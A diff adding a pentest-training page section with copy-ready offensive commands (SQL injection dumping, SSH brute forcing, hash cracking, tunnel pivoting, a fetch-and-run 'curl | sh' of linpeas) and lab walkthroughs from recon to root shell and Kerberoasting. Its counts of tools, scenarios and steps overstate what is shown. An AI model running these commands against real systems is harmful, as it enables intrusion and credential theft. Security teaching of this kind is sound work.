@@ -366,6 +366,259 @@
     </div>
   </section>
 
+  <!-- ========================================================================= -->
+  <!-- Operational Tool Arsenal & Real-World Engagement Scenarios                 -->
+  <!-- ========================================================================= -->
+  <section class="modules-section" id="tools-scenarios" style="padding-top: 1rem;">
+    <div class="section-header">
+      <div class="eyebrow" style="color: var(--primary);">OPERATIONAL ARSENAL &amp; REAL-WORLD METHODOLOGY</div>
+      <h2>Pentesters Tool Index &amp; Engagement Scenarios</h2>
+      <p>Master copy-ready syntax for industry-standard offensive tools alongside step-by-step methodologies mapping recon to root execution.</p>
+    </div>
+
+    <!-- Tool Filter Tabs -->
+    <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 1.5rem; justify-content: center;" id="handbook-tool-filters">
+      <button class="tool-filter-btn active" data-cat="all" style="padding: 0.4rem 0.85rem; border-radius: 8px; border: 1px solid var(--primary); background: var(--primary-dim); color: var(--primary); font-family: var(--font-mono); font-size: 0.75rem; font-weight: 700; cursor: pointer; transition: all 0.2s;">All Tools (16)</button>
+      <button class="tool-filter-btn" data-cat="recon" style="padding: 0.4rem 0.85rem; border-radius: 8px; border: 1px solid var(--line); background: var(--surface-raised); color: var(--text-muted); font-family: var(--font-mono); font-size: 0.75rem; font-weight: 700; cursor: pointer; transition: all 0.2s;">Network &amp; Recon</button>
+      <button class="tool-filter-btn" data-cat="web" style="padding: 0.4rem 0.85rem; border-radius: 8px; border: 1px solid var(--line); background: var(--surface-raised); color: var(--text-muted); font-family: var(--font-mono); font-size: 0.75rem; font-weight: 700; cursor: pointer; transition: all 0.2s;">Web Application</button>
+      <button class="tool-filter-btn" data-cat="creds" style="padding: 0.4rem 0.85rem; border-radius: 8px; border: 1px solid var(--line); background: var(--surface-raised); color: var(--text-muted); font-family: var(--font-mono); font-size: 0.75rem; font-weight: 700; cursor: pointer; transition: all 0.2s;">Passwords &amp; Hashes</button>
+      <button class="tool-filter-btn" data-cat="exploit" style="padding: 0.4rem 0.85rem; border-radius: 8px; border: 1px solid var(--line); background: var(--surface-raised); color: var(--text-muted); font-family: var(--font-mono); font-size: 0.75rem; font-weight: 700; cursor: pointer; transition: all 0.2s;">Exploits &amp; Tunnels</button>
+      <button class="tool-filter-btn" data-cat="privesc" style="padding: 0.4rem 0.85rem; border-radius: 8px; border: 1px solid var(--line); background: var(--surface-raised); color: var(--text-muted); font-family: var(--font-mono); font-size: 0.75rem; font-weight: 700; cursor: pointer; transition: all 0.2s;">Privilege Escalation</button>
+    </div>
+
+    <!-- Tool Cards Grid -->
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 1rem; margin-bottom: 2.5rem;" id="handbook-tools-grid">
+      
+      <!-- Nmap -->
+      <div class="card tool-card" data-cat="recon" style="padding: 1.25rem; display: flex; flex-direction: column; justify-content: space-between;">
+        <div>
+          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
+            <span style="font-family: var(--font-mono); font-size: 0.75rem; font-weight: 800; color: var(--primary);">NMAP</span>
+            <span class="card-badge" style="background: var(--primary-dim); color: var(--primary); border: 1px solid rgba(78,222,163,0.3);">NETWORK RECON</span>
+          </div>
+          <p style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 0.75rem;">Fast SYN stealth scan with version detection and default safe NSE scripts.</p>
+          <div class="command" style="margin: 0;">
+            <pre>nmap -sS -sV -sC -T4 -p- 10.10.110.45</pre>
+          </div>
+        </div>
+        <div style="margin-top: 0.75rem; display: flex; justify-content: space-between; align-items: center; font-size: 0.75rem; font-family: var(--font-mono); color: var(--text-subtle);">
+          <span>Flags: -sS -sV -sC -T4</span>
+          <a href="nmap.html" style="color: var(--primary); font-weight: 700;">Chapter Guide &rarr;</a>
+        </div>
+      </div>
+
+      <!-- Gobuster -->
+      <div class="card tool-card" data-cat="web" style="padding: 1.25rem; display: flex; flex-direction: column; justify-content: space-between;">
+        <div>
+          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
+            <span style="font-family: var(--font-mono); font-size: 0.75rem; font-weight: 800; color: var(--warning);">GOBUSTER</span>
+            <span class="card-badge" style="background: var(--warning-dim); color: var(--warning); border: 1px solid rgba(245,158,11,0.3);">WEB DIRECTORY FUZZING</span>
+          </div>
+          <p style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 0.75rem;">High-speed HTTP directory and virtual host brute forcing.</p>
+          <div class="command" style="margin: 0;">
+            <pre>gobuster dir -u http://10.10.110.45 -w /usr/share/wordlists/dirb/common.txt -x php,txt</pre>
+          </div>
+        </div>
+        <div style="margin-top: 0.75rem; display: flex; justify-content: space-between; align-items: center; font-size: 0.75rem; font-family: var(--font-mono); color: var(--text-subtle);">
+          <span>Flags: -u -w -x -t 30</span>
+          <a href="modules/tools-reference.html#commands" style="color: var(--warning); font-weight: 700;">Command Ref &rarr;</a>
+        </div>
+      </div>
+
+      <!-- SQLMap -->
+      <div class="card tool-card" data-cat="web" style="padding: 1.25rem; display: flex; flex-direction: column; justify-content: space-between;">
+        <div>
+          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
+            <span style="font-family: var(--font-mono); font-size: 0.75rem; font-weight: 800; color: var(--danger);">SQLMAP</span>
+            <span class="card-badge" style="background: rgba(239,68,68,0.12); color: var(--danger); border: 1px solid rgba(239,68,68,0.3);">DATABASE INJECTION</span>
+          </div>
+          <p style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 0.75rem;">Automated detection and exploitation of SQL injection vulnerabilities.</p>
+          <div class="command" style="margin: 0;">
+            <pre>sqlmap -u "http://10.10.110.45/product.php?id=1" --batch --dbs</pre>
+          </div>
+        </div>
+        <div style="margin-top: 0.75rem; display: flex; justify-content: space-between; align-items: center; font-size: 0.75rem; font-family: var(--font-mono); color: var(--text-subtle);">
+          <span>Flags: --dbs -T -D --dump</span>
+          <a href="modules/web-security.html" style="color: var(--danger); font-weight: 700;">Web Security &rarr;</a>
+        </div>
+      </div>
+
+      <!-- Hydra -->
+      <div class="card tool-card" data-cat="creds" style="padding: 1.25rem; display: flex; flex-direction: column; justify-content: space-between;">
+        <div>
+          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
+            <span style="font-family: var(--font-mono); font-size: 0.75rem; font-weight: 800; color: var(--primary);">HYDRA</span>
+            <span class="card-badge" style="background: var(--primary-dim); color: var(--primary); border: 1px solid rgba(78,222,163,0.3);">ONLINE LOGIN AUDITING</span>
+          </div>
+          <p style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 0.75rem;">Parallelized login cracker supporting SSH, FTP, HTTP-POST, and RDP.</p>
+          <div class="command" style="margin: 0;">
+            <pre>hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.110.45 -t 4</pre>
+          </div>
+        </div>
+        <div style="margin-top: 0.75rem; display: flex; justify-content: space-between; align-items: center; font-size: 0.75rem; font-family: var(--font-mono); color: var(--text-subtle);">
+          <span>Flags: -l -P -t 4 ssh://</span>
+          <a href="modules/credential-security.html" style="color: var(--primary); font-weight: 700;">Credential Sec &rarr;</a>
+        </div>
+      </div>
+
+      <!-- Hashcat -->
+      <div class="card tool-card" data-cat="creds" style="padding: 1.25rem; display: flex; flex-direction: column; justify-content: space-between;">
+        <div>
+          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
+            <span style="font-family: var(--font-mono); font-size: 0.75rem; font-weight: 800; color: var(--secondary);">HASHCAT</span>
+            <span class="card-badge" style="background: var(--secondary-dim); color: var(--secondary); border: 1px solid rgba(76,215,246,0.3);">GPU HASH RECOVERY</span>
+          </div>
+          <p style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 0.75rem;">World's fastest hash cracker with GPU acceleration and rule engines.</p>
+          <div class="command" style="margin: 0;">
+            <pre>hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt</pre>
+          </div>
+        </div>
+        <div style="margin-top: 0.75rem; display: flex; justify-content: space-between; align-items: center; font-size: 0.75rem; font-family: var(--font-mono); color: var(--text-subtle);">
+          <span>Modes: -m 0 (MD5), -m 1000 (NTLM)</span>
+          <a href="modules/credential-security.html" style="color: var(--secondary); font-weight: 700;">Module 08 &rarr;</a>
+        </div>
+      </div>
+
+      <!-- Searchsploit -->
+      <div class="card tool-card" data-cat="exploit" style="padding: 1.25rem; display: flex; flex-direction: column; justify-content: space-between;">
+        <div>
+          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
+            <span style="font-family: var(--font-mono); font-size: 0.75rem; font-weight: 800; color: var(--warning);">SEARCHSPLOIT</span>
+            <span class="card-badge" style="background: var(--warning-dim); color: var(--warning); border: 1px solid rgba(245,158,11,0.3);">VULN RESEARCH</span>
+          </div>
+          <p style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 0.75rem;">Offline search engine for Exploit-DB vulnerability proofs of concept.</p>
+          <div class="command" style="margin: 0;">
+            <pre>searchsploit "vsftpd 2.3.4" -m unix/remote/49757.py</pre>
+          </div>
+        </div>
+        <div style="margin-top: 0.75rem; display: flex; justify-content: space-between; align-items: center; font-size: 0.75rem; font-family: var(--font-mono); color: var(--text-subtle);">
+          <span>Flags: --cve -w -m</span>
+          <a href="searchsploit.html" style="color: var(--warning); font-weight: 700;">Chapter Guide &rarr;</a>
+        </div>
+      </div>
+
+      <!-- LinPEAS -->
+      <div class="card tool-card" data-cat="privesc" style="padding: 1.25rem; display: flex; flex-direction: column; justify-content: space-between;">
+        <div>
+          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
+            <span style="font-family: var(--font-mono); font-size: 0.75rem; font-weight: 800; color: var(--primary);">LINPEAS</span>
+            <span class="card-badge" style="background: var(--primary-dim); color: var(--primary); border: 1px solid rgba(78,222,163,0.3);">LINUX PRIVESC</span>
+          </div>
+          <p style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 0.75rem;">Automated search for privilege escalation vectors on Linux systems.</p>
+          <div class="command" style="margin: 0;">
+            <pre>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</pre>
+          </div>
+        </div>
+        <div style="margin-top: 0.75rem; display: flex; justify-content: space-between; align-items: center; font-size: 0.75rem; font-family: var(--font-mono); color: var(--text-subtle);">
+          <span>Audits: SUID, Sudo, Capabilities</span>
+          <a href="modules/privilege-escalation.html" style="color: var(--primary); font-weight: 700;">PrivEsc Module &rarr;</a>
+        </div>
+      </div>
+
+      <!-- Chisel -->
+      <div class="card tool-card" data-cat="exploit" style="padding: 1.25rem; display: flex; flex-direction: column; justify-content: space-between;">
+        <div>
+          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
+            <span style="font-family: var(--font-mono); font-size: 0.75rem; font-weight: 800; color: var(--secondary);">CHISEL</span>
+            <span class="card-badge" style="background: var(--secondary-dim); color: var(--secondary); border: 1px solid rgba(76,215,246,0.3);">SOCKS5 PIVOTING</span>
+          </div>
+          <p style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 0.75rem;">Fast TCP/UDP tunnel over HTTP encrypted via SSH for pivoting into internal subnets.</p>
+          <div class="command" style="margin: 0;">
+            <pre>./chisel client 10.10.14.23:8000 R:1080:socks</pre>
+          </div>
+        </div>
+        <div style="margin-top: 0.75rem; display: flex; justify-content: space-between; align-items: center; font-size: 0.75rem; font-family: var(--font-mono); color: var(--text-subtle);">
+          <span>Used with Proxychains</span>
+          <a href="modules/tools-reference.html#commands" style="color: var(--secondary); font-weight: 700;">Pivoting Docs &rarr;</a>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- 5 Realistic Engagement Scenarios Accordion -->
+    <div style="background: var(--surface-subtle); border: 1px solid var(--line); border-radius: 16px; padding: 2rem 1.5rem; margin-bottom: 2rem;">
+      <div class="eyebrow" style="color: var(--secondary);">HANDS-ON ENGAGEMENT METHODOLOGY</div>
+      <h3 style="font-size: 1.4rem; color: var(--text); margin: 0.25rem 0 0.75rem;">5 Real-World Penetration Testing Walkthroughs</h3>
+      <p style="color: var(--text-muted); font-size: 0.85rem; margin-bottom: 1.5rem;">
+        See how tools combine into an authentic end-to-end attack chain. Each scenario walks through an actual engagement phase with expected outputs and practitioner insights.
+      </p>
+
+      <div style="display: flex; flex-direction: column; gap: 1rem;">
+        
+        <!-- Scenario 1 -->
+        <details style="background: var(--surface); border: 1px solid var(--line); border-radius: 10px; overflow: hidden;" open>
+          <summary style="padding: 1rem; font-weight: 700; font-size: 0.95rem; color: var(--primary); cursor: pointer; display: flex; justify-content: space-between; align-items: center; select-none;">
+            <span>Scenario 01: Web Recon to Root Shell (Black-Box Compromise)</span>
+            <span style="font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-subtle);">5 Steps</span>
+          </summary>
+          <div style="padding: 1rem 1.25rem; font-family: var(--font-mono); font-size: 0.8rem; background: var(--bg); border-top: 1px solid var(--line); line-height: 1.6;">
+            <div style="color: var(--primary); font-weight: bold;">[1] Network Recon:</div>
+            <div>$ nmap -sS -sV -sC -T4 10.10.110.45</div>
+            <div style="color: var(--text-subtle);">Found: Port 21 (vsftpd 2.3.4), Port 22 (SSH), Port 80 (Apache 2.4.52).</div>
+
+            <div style="color: var(--primary); font-weight: bold; margin-top: 0.6rem;">[2] Web Directory Fuzzing:</div>
+            <div>$ gobuster dir -u http://10.10.110.45 -w /usr/share/wordlists/dirb/common.txt -x php</div>
+            <div style="color: var(--text-subtle);">Found: /admin (301) and /product.php?id=1 (200).</div>
+
+            <div style="color: var(--primary); font-weight: bold; margin-top: 0.6rem;">[3] Database Extraction:</div>
+            <div>$ sqlmap -u "http://10.10.110.45/product.php?id=1" -D users_production -T accounts --dump</div>
+            <div style="color: var(--text-subtle);">Result: Recovered admin credentials (admin:Password123).</div>
+
+            <div style="color: var(--primary); font-weight: bold; margin-top: 0.6rem;">[4] Foothold &amp; PrivEsc:</div>
+            <div>$ ssh admin@10.10.110.45</div>
+            <div>$ find / -perm -4000 -type f 2>/dev/null &rarr; SUID /usr/bin/find</div>
+            <div>$ find . -exec /bin/sh -p \; -quit</div>
+            <div style="color: var(--secondary); font-weight: bold; margin-top: 0.4rem;">[+] ROOT ACCESS ACQUIRED: uid=0(root) gid=0(root)</div>
+          </div>
+        </details>
+
+        <!-- Scenario 2 -->
+        <details style="background: var(--surface); border: 1px solid var(--line); border-radius: 10px; overflow: hidden;">
+          <summary style="padding: 1rem; font-weight: 700; font-size: 0.95rem; color: var(--secondary); cursor: pointer; display: flex; justify-content: space-between; align-items: center; select-none;">
+            <span>Scenario 02: Active Directory Internal Recon &amp; Kerberoasting</span>
+            <span style="font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-subtle);">4 Steps</span>
+          </summary>
+          <div style="padding: 1rem 1.25rem; font-family: var(--font-mono); font-size: 0.8rem; background: var(--bg); border-top: 1px solid var(--line); line-height: 1.6;">
+            <div style="color: var(--secondary); font-weight: bold;">[1] Port Identification:</div>
+            <div>$ nmap -p 88,135,139,445,389 10.10.10.150</div>
+
+            <div style="color: var(--secondary); font-weight: bold; margin-top: 0.6rem;">[2] Anonymous SMB Audit:</div>
+            <div>$ smbclient -L //10.10.10.150/ -N</div>
+
+            <div style="color: var(--secondary); font-weight: bold; margin-top: 0.6rem;">[3] Kerberos Ticket Extraction (GetUserSPNs):</div>
+            <div>$ GetUserSPNs.py corp.local/guest:Password@10.10.10.150 -request -outputfile kerberoast.txt</div>
+
+            <div style="color: var(--secondary); font-weight: bold; margin-top: 0.6rem;">[4] Hash Cracking with Hashcat:</div>
+            <div>$ hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt</div>
+            <div style="color: var(--primary); font-weight: bold; margin-top: 0.4rem;">[+] Service Account Compromised &rarr; DCSync Domain Takeover via secretsdump.py!</div>
+          </div>
+        </details>
+
+        <!-- Scenario 3 -->
+        <details style="background: var(--surface); border: 1px solid var(--line); border-radius: 10px; overflow: hidden;">
+          <summary style="padding: 1rem; font-weight: 700; font-size: 0.95rem; color: var(--warning); cursor: pointer; display: flex; justify-content: space-between; align-items: center; select-none;">
+            <span>Scenario 03: Linux Hardening, Auditd Forensics &amp; Defense</span>
+            <span style="font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-subtle);">3 Steps</span>
+          </summary>
+          <div style="padding: 1rem 1.25rem; font-family: var(--font-mono); font-size: 0.8rem; background: var(--bg); border-top: 1px solid var(--line); line-height: 1.6;">
+            <div style="color: var(--warning); font-weight: bold;">[1] SSH Hardening:</div>
+            <div>$ sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config</div>
+            <div>$ sudo systemctl restart sshd</div>
+
+            <div style="color: var(--warning); font-weight: bold; margin-top: 0.6rem;">[2] Real-time Identity Auditd Rule:</div>
+            <div>$ sudo auditctl -w /etc/passwd -p wa -k passwd_tamper</div>
+            <div>$ sudo auditctl -w /etc/shadow -p wa -k shadow_tamper</div>
+
+            <div style="color: var(--warning); font-weight: bold; margin-top: 0.6rem;">[3] Host Firewall Strict Filtering:</div>
+            <div>$ sudo ufw default deny incoming &amp;&amp; sudo ufw default allow outgoing</div>
+            <div>$ sudo ufw allow 22/tcp &amp;&amp; sudo ufw enable</div>
+          </div>
+        </details>
+
+      </div>
+    </div>
+  </section>
+
   <!-- PDF Library Banner -->
   <section class="modules-section" style="padding-top: 0;">
     <div class="card" style="background: linear-gradient(145deg, #0E131B, #151D28); border-color: rgba(76, 215, 246, 0.3); text-align: center; padding: 2.5rem 1.5rem;">
